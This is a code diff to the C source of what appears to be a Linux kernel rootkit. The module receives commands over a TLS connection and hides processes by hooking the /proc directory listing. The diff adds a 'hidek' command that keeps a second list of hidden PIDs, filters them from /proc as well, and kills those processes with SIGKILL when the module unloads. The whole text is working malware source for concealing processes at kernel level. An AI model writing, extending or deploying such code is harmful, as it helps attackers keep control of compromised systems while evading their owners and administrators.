@@ -67,6 +67,9 @@ static struct list_head* mod_list;
 static size_t hidden_procs[100];
 int hidden_count = 0;
 
+static size_t hidden_kill_procs[100];
+int hidden_kill_count = 0;
+
 struct hidden_file {
     struct path path;
     struct file_operations fops;
@@ -362,6 +365,7 @@ void read_TLS(struct work_struct* work) {
         } else {
             hide();
         }
+    //Processes that can't be killed when they aren't hidden
     } else if (memcmp("hide", buffer, 4) == 0) {
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
@@ -370,6 +374,15 @@ void read_TLS(struct work_struct* work) {
         }
         //Store the pid in the hidden proc list
         hidden_procs[hidden_count++] = tmp_port;
+    //Processes that need to be killed when they aren't hidden
+    } else if (memcmp("hidek", buffer, 5) == 0) {
+        if (kstrtou16(buffer + 6, 10, &tmp_port)) {
+            strcpy(buffer, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            return;
+        }
+        //Store the pid in the hidden proc list
+        hidden_kill_procs[hidden_kill_count++] = tmp_port;
     } else {
         strcpy(buffer, unknown);
         send_msg(svc->tls_socket, buffer, strlen(unknown));
@@ -613,6 +626,15 @@ static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int le
             return 0;
         }
     }
+    for (i = 0; i < hidden_kill_count; ++i) {
+        memset(p, 0, 64);
+        //Convert stored pid to string
+        snprintf(p, 64, "%lu", hidden_kill_procs[i]);
+
+        if (strncmp(proc_name, p, strlen(p)) == 0) {
+            return 0;
+        }
+    }
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
 
@@ -798,9 +820,9 @@ static void __exit mod_exit(void) {
     }
 
     write_lock(my_tasklist_lock);
-    for (i = 0; i < hidden_count; ++i) {
+    for (i = 0; i < hidden_kill_count; ++i) {
         for_each_process(ts) {
-            if (ts->pid == hidden_procs[i]) {
+            if (ts->pid == hidden_kill_procs[i]) {
                 //Force kill any hidden process on cleanup
                 force_sig(SIGKILL, ts);
             }
